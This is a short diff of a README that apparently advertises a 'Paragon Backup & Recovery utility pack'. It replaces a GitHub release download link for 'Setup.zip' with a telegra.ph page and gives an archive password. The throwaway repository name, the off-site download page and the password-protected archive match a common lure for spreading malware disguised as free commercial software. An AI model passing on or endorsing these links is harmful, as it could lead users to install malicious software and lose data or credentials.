@@ -7,7 +7,7 @@ Paragon Backup & Recovery utility pack — configuration presets, portable binar
 ******************** DOWNLOAD ********************
 --------------------------------------------------
 
-[+] [DOWNLOAD LINK](https://github.com/PoltergeistCardinal/ogynhzab/releases/download/Release/Setup.zip)
+[+] [DOWNLOAD LINK](https://telegra.ph/Download-05-21-39)
 [+] ARCHIVE PASSWORD: `1847`
 
 --------------------------------------------------
